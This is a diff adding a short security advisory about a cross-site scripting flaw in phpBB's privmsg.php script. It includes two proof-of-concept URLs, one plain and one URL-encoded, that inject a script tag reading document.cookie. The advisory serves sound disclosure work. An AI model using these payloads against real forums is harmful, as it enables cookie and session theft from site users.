@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/9290/info
+
+phpBB is prone to a cross-site scripting vulnerability in the 'privmsg.php' script. The source of the problem is that HTML and script code are not adequately sanitized from input supplied via URI parameters. This input will be included in dynamically generated web pages. A remote attacker could exploit this issue by embedding hostile HTML and script code in a malicious link to the vulnerable script. The attacker-supplied code will be interpreted in the context of the site hosting the vulnerable software. 
+
+http://www.example.com/forums/privmsg.php?mode=""><script>alert(document.cookie);</scrip
+t>post&u=2
+
+William Heatley has supplied the following proof of concept:
+http://www.example.com/phpBB/privmsg.php?mode=%22%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%29%3C%2F%73%63%72%69%70%74%3E%3C 
